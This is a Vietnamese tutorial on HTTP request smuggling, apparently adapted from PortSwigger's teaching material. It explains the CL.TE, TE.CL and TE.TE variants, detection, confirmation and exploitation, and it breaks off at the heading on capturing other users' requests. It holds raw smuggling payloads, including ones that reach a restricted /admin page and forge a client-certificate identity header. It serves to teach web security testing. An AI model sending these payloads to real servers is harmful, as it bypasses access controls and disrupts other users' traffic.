<!-- TOC -->
## Mục lục

- [Giới thiệu chung](#giới-thiệu-chung)
- [Khái niệm](#khái-niệm)
- [Diễn biến](#diễn-biến)
- [Nguyên nhân](#nguyên-nhân)
- [Xây dựng cuộc tấn công](#xây-dựng-cuộc-tấn-công)
  - [CL.TE](#clte)
  - [[TE.CL](http://TE.CL)](#teclhttptecl)
  - [TE.TE](#tete)
- [Kiểm thử](#kiểm-thử)
  - [CL.TE](#clte-1)
  - [[TE.CL](http://TE.CL)](#teclhttptecl-1)
- [Xác nhận](#xác-nhận)
  - [CL.TE](#clte-2)
  - [[TE.CL](http://TE.CL)](#teclhttptecl-2)
- [Xâm nhập](#xâm-nhập)
  - [Vượt cơ chế bảo vệ](#vượt-cơ-chế-bảo-vệ)
  - [Chỉnh sửa HTTP Request](#chỉnh-sửa-http-request)
  - [Vượt xác thực người dùng](#vượt-xác-thực-người-dùng)
  - [Thu thập request](#thu-thập-request)
  - [XSS](#xss)
  - [On-site → Open](#on-site--open)
    - [Root-relative → Open](#root-relative--open)
  - [Web cache Poisoning](#web-cache-poisoning)
  - [Web cache Deception](#web-cache-deception)
- [Xâm nhập nâng cao](#xâm-nhập-nâng-cao)
  - [HTTP/2](#http2)
    - [Message length](#message-length)
    - [**HTTP/2 downgrading**](#http2-downgrading)
    - [[H2.CL](http://H2.CL)](#h2clhttph2cl)
    - [H2.TE](#h2te)
    - [HTTP/2 ẩn](#http2-ẩn)
    - [**HTTP/2-exclusive vectors**](#http2-exclusive-vectors)
  - [**Response queue**](#response-queue)
    - [Hậu quả](#hậu-quả)
    - [Xây dựng cuộc tấn công](#xây-dựng-cuộc-tấn-công-1)
  - [HTTP/2 request splitting](#http2-request-splitting)
    - [Viết lại FE](#viết-lại-fe)
  - [**HTTP request tunnelling**](#http-request-tunnelling)
    - [HTTP/2](#http2-1)
    - [**Leaking internal headers**](#leaking-internal-headers)
    - [**Blind request**](#blind-request)
    - [**Non-blind request**](#non-blind-request)
  - [Web cache](#web-cache)
  - [[0.CL](http://0.CL)](#0clhttp0cl)
- [**Browser-powered**](#browser-powered)
  - [CL.0](#cl0)
    - [Kiểm thử](#kiểm-thử-1)
    - [Kích hoạt](#kích-hoạt)
    - [Khai thác](#khai-thác)
    - [H2.0](#h20)
    - [Bảo mật](#bảo-mật)
  - [Tấn công desync](#tấn-công-desync)
    - [Khái niệm](#khái-niệm-1)
    - [Kiểm thử](#kiểm-thử-2)
    - [Xâm nhập](#xâm-nhập-1)
    - [Pause-based desync](#pause-based-desync)
- [Bảo mật](#bảo-mật-1)
- [WU](#wu)
  - [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](#http-request-smuggling-confirming-a-clte-vulnerability-via-differential-responses)
  - [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](#http-request-smuggling-confirming-a-tecl-vulnerability-via-differential-responses)
  - [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
  - [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
  - [Exploiting HTTP request smuggling to reveal front-end request rewriting](#exploiting-http-request-smuggling-to-reveal-front-end-request-rewriting)
  - [Exploiting HTTP request smuggling to capture other users' requests](#exploiting-http-request-smuggling-to-capture-other-users-requests)
  - [Exploiting HTTP request smuggling to deliver reflected XSS](#exploiting-http-request-smuggling-to-deliver-reflected-xss)
  - [Response queue poisoning via H2.TE request smuggling](#response-queue-poisoning-via-h2te-request-smuggling)
  - [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)
  - [HTTP request smuggling, basic TE.CL vulnerability](#http-request-smuggling-basic-tecl-vulnerability)
  - [HTTP request smuggling, obfuscating the TE header](#http-request-smuggling-obfuscating-the-te-header)
  - [CL.0 request smuggling](#cl0-request-smuggling)
  - [H2.CL request smuggling](#h2cl-request-smuggling)
  - [HTTP/2 request smuggling via CRLF injection](#http2-request-smuggling-via-crlf-injection)
  - [HTTP/2 request splitting via CRLF injection](#http2-request-splitting-via-crlf-injection)
<!-- /TOC -->

# Giới thiệu chung

Trong phần này, chúng tôi sẽ giải thích các cuộc tấn công tráo yêu cầu HTTP (HTTP request smuggling) và mô tả cách các lỗ hổng tráo yêu cầu phổ biến có thể phát sinh.
# Khái niệm

HTTP request smuggling là một kỹ thuật can thiệp vào cách một website xử lý các chuỗi yêu cầu HTTP được nhận từ một hoặc nhiều người dùng. Các lỗ hổng request smuggling thường mang tính chất nghiêm trọng, cho phép kẻ tấn công vượt qua các cơ chế bảo mật, truy cập trái phép vào dữ liệu nhạy cảm và trực tiếp xâm hại những người dùng ứng dụng khác.

Tráo yêu cầu (request smuggling) chủ yếu liên quan đến các yêu cầu HTTP/1. Tuy nhiên, các website hỗ trợ HTTP/2 cũng có thể dễ bị tổn thương, tùy thuộc vào kiến trúc backend của chúng.
![](../../image/Pasted%20image%2020260507110432.png)

> **Nghiên cứu PortSwigger**
> 
> HTTP request smuggling lần đầu được ghi nhận vào năm 2005, và được làm sống lại phổ biến nhờ các nghiên cứu sâu rộng của PortSwigger về chủ đề này. Để biết chi tiết, hãy tham khảo các báo trắng sau:
> 
> - Các cuộc tấn công desync HTTP: Tráo yêu cầu hồi sinh
> - HTTP/2: Phần tiếp theo luôn tệ hơn
> - Các cuộc tấn công desync do trình duyệt điều khiển: Một biên giới mới trong tráo yêu cầu HTTP
# Diễn biến

Các ứng dụng web ngày nay thường sử dụng chuỗi nhiều máy chủ HTTP giữa người dùng và phần logic ứng dụng cuối cùng. Người dùng gửi yêu cầu đến một máy chủ phía trước (đôi khi gọi là load balancer hoặc reverse proxy) và máy chủ này chuyển tiếp các yêu cầu đến một hoặc nhiều máy chủ phía sau (back-end). Kiến trúc loại này ngày càng phổ biến và trong một số trường hợp là không thể tránh được trong các ứng dụng hiện đại trên đám mây.

Khi máy chủ phía trước chuyển tiếp các yêu cầu HTTP đến máy chủ phía sau, nó thường gửi nhiều yêu cầu trên cùng một kết nối mạng đến back-end, bởi vì cách này hiệu quả và có hiệu năng cao hơn. Giao thức rất đơn giản; các yêu cầu HTTP được gửi nối tiếp nhau, và máy chủ nhận phải xác định được nơi một yêu cầu kết thúc và yêu cầu tiếp theo bắt đầu:
![](../../image/Pasted%20image%2020260507110525.png)
Trong tình huống này, điều then chốt là hệ thống phía trước và phía sau phải thống nhất về ranh giới giữa các yêu cầu. Nếu không, kẻ tấn công có thể gửi một yêu cầu mơ hồ (ambiguous) mà máy chủ phía trước và phía sau hiểu khác nhau:
![](../../image/Pasted%20image%2020260507110649.png)
Ở đây, kẻ tấn công khiến một phần của yêu cầu gửi tới máy chủ phía trước bị máy chủ phía sau hiểu nhầm là phần bắt đầu của yêu cầu tiếp theo. Phần đó về cơ bản được ghép vào trước yêu cầu tiếp theo, và do đó có thể can thiệp vào cách ứng dụng xử lý yêu cầu đó. Đây là một cuộc tấn công tráo yêu cầu, và nó có thể gây ra hậu quả nghiêm trọng.

# Nguyên nhân


Hầu hết lỗ hổng HTTP request smuggling phát sinh bởi vì đặc tả HTTP/1 cung cấp hai cách khác nhau để xác định nơi một yêu cầu kết thúc: header **`Content-Length`** và header **`Transfer-Encoding`**.

Header **`Content-Length`** rất trực tiếp: nó chỉ định độ dài của phần thân (message body) theo byte. Ví dụ:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Header **`Transfer-Encoding`** có thể được dùng để chỉ rằng phần thân sử dụng **mã hóa phân đoạn** (chunked encoding). Điều này có nghĩa phần thân chứa một hoặc nhiều khối (chunk) dữ liệu. Mỗi khối gồm kích thước khối theo byte (viết theo hệ thập lục phân), tiếp theo là một dòng mới, rồi nội dung của khối. Thông điệp kết thúc bằng một khối có kích thước bằng không. Ví dụ:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

> **Ghi chú**
> 
> Nhiều người kiểm thử bảo mật không biết rằng chunked encoding có thể được sử dụng trong các yêu cầu HTTP, vì hai lý do:
> 
> - Burp Suite tự động giải nén chunked encoding để khiến tin nhắn dễ xem và sửa hơn.
> - Trình duyệt thường không sử dụng chunked encoding trong các yêu cầu; chunked encoding thường chỉ thấy trong phản hồi của máy chủ.

Vì đặc tả HTTP/1 cung cấp hai phương pháp khác nhau để chỉ độ dài của thông điệp HTTP, nên có thể một thông điệp đơn lẻ sử dụng cả hai phương pháp cùng lúc, dẫn đến mâu thuẫn giữa chúng. Đặc tả cố gắng ngăn vấn đề này bằng cách nói rằng nếu cả **`Content-Length`** và **`Transfer-Encoding`** cùng xuất hiện thì **`Content-Length`** nên bị bỏ qua. Điều này có thể đủ để tránh mơ hồ khi chỉ có một máy chủ tham gia, nhưng không đủ khi hai hoặc nhiều máy chủ được xâu chuỗi với nhau. Trong tình huống đó, vấn đề có thể phát sinh vì hai lý do:

- Một số máy chủ không hỗ trợ header `T**ransfer-Encoding**` trong các yêu cầu.
- Một số máy chủ hỗ trợ **`Transfer-Encoding`** nhưng có thể bị khiến không xử lý header này nếu header bị ngụy trang/biến đổi theo một cách nào đó.

Nếu máy chủ phía trước và máy chủ phía sau hành xử khác nhau liên quan đến header **`Transfer-Encoding`** (có thể đã bị ngụy trang), thì chúng có thể không đồng ý về ranh giới giữa các yêu cầu liên tiếp, dẫn tới lỗ hổng request smuggling.

> Ghi chú
> 
> Các website sử dụng HTTP/2 đầu-cuối (end-to-end) vốn dĩ miễn nhiễm với các cuộc tấn công request smuggling. Vì đặc tả HTTP/2 giới thiệu một cơ chế duy nhất và chắc chắn để chỉ độ dài của một yêu cầu, không có cách nào để kẻ tấn công tạo ra sự mơ hồ cần thiết.
> 
> Tuy nhiên, nhiều website có một máy chủ phía trước nói chuyện bằng HTTP/2, nhưng phía sau vẫn triển khai hạ tầng chỉ hỗ trợ HTTP/1. Điều này có nghĩa máy chủ phía trước thực tế phải dịch (translate) các yêu cầu nó nhận thành HTTP/1. Quá trình này được gọi là **HTTP downgrading**. Để biết thêm, xem phần _Advanced request smuggling_.

# Xây dựng cuộc tấn công

Các cuộc tấn công request smuggling cổ điển liên quan đến việc đặt cả header **`Content-Length`** và **`Transfer-Encoding`** vào cùng một yêu cầu HTTP/1 và điều chỉnh chúng sao cho máy chủ phía trước và phía sau xử lý yêu cầu theo cách khác nhau. Cách chính xác thực hiện điều này phụ thuộc vào hành vi của hai máy chủ:

- **CL.TE**: máy chủ phía trước sử dụng header **`Content-Length`** còn máy chủ phía sau sử dụng header **`Transfer-Encoding`**.
- **[TE.CL](http://TE.CL)**: máy chủ phía trước sử dụng header **`Transfer-Encoding`** còn máy chủ phía sau sử dụng header **`Content-Length`**.
- **TE.TE**: cả máy chủ phía trước và phía sau đều hỗ trợ header **`Transfer-Encoding`**, nhưng có thể khiến một trong hai máy chủ không xử lý header này bằng cách ngụy trang header theo một cách nào đó.

> Ghi chú
> 
> Các kỹ thuật này chỉ khả dụng khi dùng yêu cầu **HTTP/1**. Trình duyệt và các client khác, bao gồm Burp, mặc định sử dụng **HTTP/2** để giao tiếp với các máy chủ quảng báo hỗ trợ nó trong quá trình bắt tay TLS.
> 
> Do đó, khi kiểm thử các trang hỗ trợ HTTP/2, bạn cần chuyển thủ công giao thức trong **Burp Repeater**. Bạn có thể thay đổi điều này từ phần **Request attributes** trong bảng **Inspector**.

## CL.TE


Ở đây, máy chủ phía trước sử dụng header **`Content-Length`** còn máy chủ phía sau sử dụng header **`Transfer-Encoding`**. Ta có thể thực hiện một cuộc tấn công tráo yêu cầu HTTP đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Máy chủ phía trước xử lý header **`Content-Length`** và xác định rằng thân yêu cầu dài 13 byte, tính đến hết `SMUGGLED`. Yêu cầu này được chuyển tiếp tới máy chủ phía sau.

Máy chủ phía sau xử lý header **`Transfer-Encoding`**, do đó coi thân thông điệp là sử dụng mã hóa phân đoạn (chunked encoding). Nó xử lý khối đầu tiên, được khai báo có độ dài bằng không, và do đó được coi là kết thúc yêu cầu. Các byte tiếp theo, `SMUGGLED`, không được xử lý, và máy chủ phía sau sẽ coi chúng là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

## [TE.CL](http://TE.CL)


Ở đây, máy chủ phía trước sử dụng header **`Transfer-Encoding`** còn máy chủ phía sau sử dụng header **`Content-Length`**. Ta có thể thực hiện một cuộc tấn công tráo yêu cầu HTTP đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

> Ghi chú
> 
> - Để gửi yêu cầu này bằng Burp Repeater, bạn cần vào menu Repeater và đảm bảo tùy chọn **"Update Content-Length"** không được chọn.
> - Bạn cần bao gồm chuỗi kết thúc `\\r\\n\\r\\n` theo sau số `0` cuối cùng.

Máy chủ phía trước xử lý header **`Transfer-Encoding`**, do đó coi phần thân thông điệp là sử dụng mã hóa phân đoạn (chunked encoding). Nó xử lý khối đầu tiên, được khai báo dài 8 byte, tới bắt đầu dòng sau `SMUGGLED`. Nó xử lý khối thứ hai, được khai báo có độ dài bằng không, và do đó được coi là kết thúc yêu cầu. Yêu cầu này được chuyển tiếp tới máy chủ phía sau.

Máy chủ phía sau xử lý header **Content-Length** và xác định rằng thân yêu cầu dài 3 byte, tới bắt đầu dòng sau `8`. Các byte tiếp theo, bắt đầu bằng `SMUGGLED`, không được xử lý, và máy chủ phía sau sẽ coi chúng là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

## TE.TE


Ở đây, cả máy chủ phía trước và máy chủ phía sau đều hỗ trợ header **`Transfer-Encoding`**, nhưng có thể khiến một trong hai máy chủ không xử lý header này bằng cách ngụy trang (obfuscate) header theo một cách nào đó.

Có rất nhiều cách có thể ngụy trang header **Transfer-Encoding**. Ví dụ:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Mỗi kỹ thuật trong số này đều liên quan đến một sự sai lệch tinh vi so với đặc tả HTTP. Mã thực tế triển khai một đặc tả giao thức hiếm khi tuân thủ chính xác tuyệt đối, và việc các triển khai khác nhau chấp nhận các biến thể khác nhau so với đặc tả là điều phổ biến. Để phát hiện lỗ hổng **TE.TE**, cần tìm một biến thể của header **`Transfer-Encoding`** sao cho chỉ một trong hai máy chủ - phía trước hoặc phía sau - xử lý nó, trong khi máy chủ kia bỏ qua.

Tùy thuộc vào việc máy chủ phía trước hay phía sau là bên bị khiến không xử lý header **`Transfer-Encoding`** bị ngụy trang, phần còn lại của cuộc tấn công sẽ có dạng tương tự như các lỗ hổng **CL.TE** hoặc **[TE.CL](http://TE.CL)** đã mô tả trước đó.

# Kiểm thử


Cách hiệu quả nhất nói chung để phát hiện lỗ hổng HTTP request smuggling là gửi các yêu cầu sẽ gây ra **độ trễ** trong phản hồi của ứng dụng nếu tồn tại lỗ hổng. Kỹ thuật này được Burp Scanner sử dụng để **tự động hóa** việc phát hiện các lỗ hổng request smuggling.

## CL.TE


Nếu một ứng dụng dễ bị biến thể CL.TE của request smuggling, thì việc gửi một yêu cầu như sau thường sẽ gây ra một độ trễ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Vì máy chủ phía trước sử dụng header **`Content-Length`**, nó sẽ chuyển tiếp chỉ một phần của yêu cầu này, bỏ qua ký tự `X`. Máy chủ phía sau sử dụng header **`Transfer-Encoding`**, xử lý khối đầu tiên, rồi chờ khối tiếp theo đến. Điều này sẽ gây ra một độ trễ có thể quan sát được.

## [TE.CL](http://TE.CL)

Nếu một ứng dụng dễ bị biến thể [TE.CL](http://TE.CL) của request smuggling, thì việc gửi một yêu cầu như sau thường sẽ gây ra một độ trễ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Vì máy chủ phía trước sử dụng header **`Transfer-Encoding`**, nó sẽ chuyển tiếp chỉ một phần của yêu cầu này, bỏ qua ký tự `X`. Máy chủ phía sau sử dụng header **`Content-Length`**, mong đợi thêm nội dung trong phần thân thông điệp, và chờ phần nội dung còn lại đến. Điều này sẽ gây ra một độ trễ có thể quan sát được.

> **Ghi chú**
> 
> Kiểm tra dựa trên thời gian cho biến thể [TE.CL](http://TE.CL) có thể làm gián đoạn người dùng ứng dụng khác nếu ứng dụng thực tế dễ bị biến thể CL.TE. Vì vậy, để thận trọng và giảm thiểu gián đoạn, bạn nên dùng test CL.TE trước và chỉ tiến tới test [TE.CL](http://TE.CL) nếu test đầu tiên không phát hiện gì.

# Xác nhận

Khi một lỗ hổng request smuggling có khả năng tồn tại đã được phát hiện, bạn có thể thu thập bằng chứng bổ sung cho lỗ hổng bằng cách khai thác nó để gây ra sự khác biệt trong nội dung phản hồi của ứng dụng. Điều này bao gồm việc gửi hai yêu cầu tới ứng dụng liên tiếp nhanh:

- Một yêu cầu **"tấn công"** được thiết kế để can thiệp vào việc xử lý yêu cầu tiếp theo.
- Một yêu cầu **"bình thường"**.

Nếu phản hồi cho yêu cầu bình thường chứa sự can thiệp như mong đợi, thì lỗ hổng được xác nhận.

Ví dụ, giả sử yêu cầu bình thường trông như sau:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Yêu cầu này thường nhận được phản hồi HTTP với mã trạng thái **200**, chứa một số kết quả tìm kiếm.

Yêu cầu tấn công cần thiết để can thiệp vào yêu cầu này phụ thuộc vào biến thể request smuggling hiện có: **CL.TE** hay **[TE.CL](http://TE.CL)**.

## CL.TE


Để xác nhận lỗ hổng CL.TE, bạn sẽ gửi một yêu cầu tấn công như sau:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Nếu tấn công thành công, thì hai dòng cuối của yêu cầu này sẽ bị máy chủ phía sau coi là thuộc về yêu cầu tiếp theo mà nó nhận được. Điều này sẽ khiến yêu cầu "bình thường" tiếp theo trông như sau:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Vì yêu cầu này giờ chứa một URL không hợp lệ, máy chủ sẽ phản hồi với mã trạng thái **404**, cho thấy rằng yêu cầu tấn công thực sự đã can thiệp vào yêu cầu đó.

## [TE.CL](http://TE.CL)


Để xác nhận lỗ hổng [TE.CL](http://TE.CL), bạn sẽ gửi một yêu cầu tấn công như sau:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

> **Ghi chú**
> 
> - Để gửi yêu cầu này bằng Burp Repeater, trước tiên bạn cần vào menu Repeater và đảm bảo tùy chọn **"Update Content-Length"** không được chọn.
> - Bạn cần bao gồm chuỗi kết thúc `\\r\\n\\r\\n` theo sau số `0` cuối cùng.

Nếu tấn công thành công, thì mọi thứ từ `GET /404` trở đi sẽ bị máy chủ phía sau coi là thuộc về yêu cầu tiếp theo mà nó nhận được. Điều này sẽ khiến yêu cầu "bình thường" tiếp theo trông như sau:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Vì yêu cầu này giờ chứa một URL không hợp lệ, máy chủ sẽ phản hồi với mã trạng thái **404**, cho thấy rằng yêu cầu tấn công thực sự đã can thiệp vào yêu cầu đó.

> **Ghi chú**
> 
> Một số lưu ý quan trọng cần nhớ khi cố gắng xác nhận lỗ hổng request smuggling thông qua việc can thiệp vào các yêu cầu khác:
> 
> - Yêu cầu **"tấn công"** và yêu cầu **"bình thường"** nên được gửi tới máy chủ sử dụng các kết nối mạng khác nhau. Gửi cả hai yêu cầu qua cùng một kết nối sẽ không chứng minh được lỗ hổng tồn tại.
> - Yêu cầu **"tấn công"** và yêu cầu **"bình thường"** nên sử dụng cùng URL và tên tham số càng nhiều càng tốt. Lý do là nhiều ứng dụng hiện đại chuyển tiếp các yêu cầu front-end tới các máy chủ back-end khác nhau dựa trên URL và tham số. Sử dụng cùng URL và tham số tăng khả năng các yêu cầu sẽ được xử lý bởi cùng một máy chủ back-end, điều cần thiết để cuộc tấn công hoạt động.
> - Khi kiểm thử yêu cầu **"bình thường"** để phát hiện bất kỳ sự can thiệp nào từ yêu cầu **"tấn công"**, bạn đang chạy đua với mọi yêu cầu khác mà ứng dụng đang nhận cùng lúc, bao gồm cả những yêu cầu từ người dùng khác. Bạn nên gửi yêu cầu **"bình thường"** ngay lập tức sau yêu cầu **"tấn công"**. Nếu ứng dụng đang bận, bạn có thể cần thử nhiều lần để xác nhận lỗ hổng.
> - Trong một số ứng dụng, máy chủ phía trước đóng vai trò như load balancer, và chuyển tiếp các yêu cầu tới các hệ thống back-end khác nhau theo thuật toán cân bằng tải. Nếu yêu cầu **"tấn công"** và **"bình thường"** của bạn được chuyển tới các hệ thống back-end khác nhau, thì cuộc tấn công sẽ thất bại. Đây là một lý do bổ sung khiến bạn có thể cần thử nhiều lần trước khi có thể xác nhận lỗ hổng.
> - Nếu tấn công của bạn thành công trong việc can thiệp vào một yêu cầu tiếp theo, nhưng đó không phải là yêu cầu **"bình thường"** mà bạn gửi để phát hiện sự can thiệp, thì điều đó có nghĩa là một người dùng ứng dụng khác đã bị ảnh hưởng bởi cuộc tấn công của bạn. Nếu bạn tiếp tục thực hiện kiểm thử, điều này có thể gây tác động gián đoạn tới người dùng khác, và bạn nên thận trọng.

# Xâm nhập

Trong phần này, chúng tôi sẽ mô tả các cách khác nhau mà lỗ hổng HTTP request smuggling có thể bị khai thác, tùy thuộc vào chức năng dự kiến và các hành vi khác của ứng dụng.
## Vượt cơ chế bảo vệ

Trong một số ứng dụng, máy chủ front-end được dùng để thực hiện một số cơ chế bảo mật, quyết định xem các yêu cầu riêng lẻ có được phép xử lý hay không. Các yêu cầu được cho phép sẽ được chuyển tiếp tới máy chủ back-end, nơi chúng được xem là đã vượt qua các kiểm soát front-end.

Ví dụ, giả sử một ứng dụng sử dụng máy chủ front-end để thực thi các hạn chế kiểm soát truy cập, chỉ chuyển tiếp các yêu cầu nếu người dùng được ủy quyền truy cập URL yêu cầu. Máy chủ back-end sau đó chấp nhận mọi yêu cầu mà không kiểm tra thêm. Trong tình huống này, một lỗ hổng HTTP request smuggling có thể được dùng để vượt qua các kiểm soát truy cập, bằng cách nhét (smuggle) một yêu cầu đến URL bị hạn chế.

Giả sử người dùng hiện tại được phép truy cập `/home` nhưng không được phép truy cập `/admin`. Họ có thể vượt qua hạn chế này bằng cách tấn công request smuggling như sau:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

Máy chủ front-end nhìn thấy hai yêu cầu ở đây, cả hai đều là cho `/home`, và vì vậy các yêu cầu được chuyển tiếp tới máy chủ back-end. Tuy nhiên, máy chủ back-end thấy một yêu cầu cho `/home` và một yêu cầu cho `/admin`. Nó giả định (như mọi khi) rằng các yêu cầu đã vượt qua các kiểm soát front-end, và do đó cấp quyền truy cập tới URL bị hạn chế.

## Chỉnh sửa HTTP Request

---

Trong nhiều ứng dụng, máy chủ front-end thực hiện một số thao tác chỉnh sửa (rewrite) yêu cầu trước khi chuyển tiếp tới máy chủ back-end, thường bằng cách thêm một vài header bổ sung. Ví dụ, máy chủ front-end có thể:

- chấm dứt kết nối TLS và thêm một số header mô tả giao thức và cipher đã dùng;
- thêm header `X-Forwarded-For` chứa địa chỉ IP của người dùng;
- xác định ID người dùng dựa trên token phiên (session token) và thêm một header nhận diện người dùng; hoặc
- thêm một số thông tin nhạy cảm mà kẻ tấn công quan tâm cho các cuộc tấn công khác.

Trong một số tình huống, nếu các yêu cầu bị smuggle của bạn thiếu một vài header mà front-end thường thêm, thì máy chủ back-end có thể không xử lý các yêu cầu đó theo cách bình thường, dẫn đến các yêu cầu smuggled không có hiệu ứng như mong muốn.

Thường có một cách đơn giản để tiết lộ chính xác front-end đang chỉnh sửa (rewrite) những gì trong yêu cầu. Để làm điều này, bạn cần thực hiện các bước sau:

1. Tìm một yêu cầu POST mà tham số của yêu cầu được phản hồi (reflected) lại vào phản hồi (response) của ứng dụng.
2. Hoán vị (shuffle) các tham số sao cho tham số bị phản hồi xuất hiện ở cuối thân (message body).
3. Smuggle yêu cầu này tới máy chủ back-end, ngay sau đó là một yêu cầu bình thường mà bạn muốn tiết lộ dạng đã được rewrite của nó.

Giả sử ứng dụng có chức năng đăng nhập (login) phản hồi giá trị của tham số `email`:

```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

Kết quả là phản hồi chứa:

```
<input id="email" value="wiener@normal-user.net" type="text">
```

Ở đây bạn có thể dùng cuộc tấn công request smuggling sau để tiết lộ các chỉnh sửa mà front-end thực hiện:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

Các yêu cầu sẽ bị front-end rewrite để chèn các header bổ sung, và sau đó máy chủ back-end sẽ xử lý yêu cầu bị smuggled và coi yêu cầu thứ hai (sau khi đã được rewrite) như là giá trị của tham số `email`. Nó sẽ phản hồi lại giá trị này trong phản hồi cho yêu cầu thứ hai:

```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

> Lưu ý
> 
> Vì yêu cầu cuối cùng đang bị rewrite, bạn không biết chính xác nó sẽ dài bao nhiêu. Giá trị trong header `Content-Length` của yêu cầu bị smuggled sẽ quyết định độ dài mà máy chủ back-end tin rằng yêu cầu đó có. Nếu bạn đặt giá trị này quá ngắn, bạn sẽ chỉ nhận được một phần của yêu cầu đã được rewrite; nếu bạn đặt quá dài, máy chủ back-end sẽ chờ timeout để yêu cầu hoàn tất. Giải pháp là đoán một giá trị ban đầu hơi lớn hơn so với yêu cầu gửi đi, rồi tăng dần giá trị đó để lấy thêm thông tin, cho đến khi bạn có được toàn bộ phần thông tin cần thiết.
> 
> Khi bạn đã tiết lộ được front-end rewrite những gì, bạn có thể áp dụng các chỉnh sửa tương ứng lên các yêu cầu smuggled của mình, để đảm bảo chúng được máy chủ back-end xử lý theo cách bạn mong muốn.

## Vượt xác thực người dùng

Trong quá trình bắt tay TLS, máy chủ xác thực chính nó với client (thường là trình duyệt) bằng cách cung cấp một chứng chỉ. Chứng chỉ này chứa “tên chung” (common name - CN) của máy chủ, và giá trị này nên khớp với hostname đã đăng ký. Client sau đó có thể dùng điều này để xác minh rằng họ đang giao tiếp với một máy chủ hợp lệ thuộc về tên miền mong đợi.

Một số trang tiến thêm một bước và triển khai dạng xác thực TLS hai chiều (mutual TLS), trong đó client cũng phải trình một chứng chỉ cho máy chủ. Trong trường hợp này, CN của client thường là một tên người dùng hoặc tương tự, và có thể được dùng trong logic ứng dụng phía back-end như một phần của cơ chế kiểm soát truy cập, ví dụ.

Thành phần thực hiện xác thực client thường chuyển các thông tin liên quan từ chứng chỉ tới ứng dụng hoặc máy chủ back-end thông qua một hoặc nhiều header HTTP không chuẩn. Ví dụ, máy chủ phía trước đôi khi thêm một header chứa CN của client vào mọi yêu cầu đến:

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

Vì các header này được cho là hoàn toàn ẩn khỏi người dùng, chúng thường bị back-end tin tưởng ngầm. Nếu bạn có thể gửi đúng kết hợp các header và giá trị, điều này có thể cho phép bạn vượt qua cơ chế kiểm soát truy cập.

Trong thực tế, hành vi này thường không thể khai thác vì máy chủ phía trước có xu hướng ghi đè những header này nếu chúng đã tồn tại. Tuy nhiên, những yêu cầu bị smuggle sẽ bị ẩn hoàn toàn khỏi phía trước, nên bất kỳ header nào chúng chứa sẽ được gửi tới back-end mà không bị thay đổi.

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```
## Thu thập request

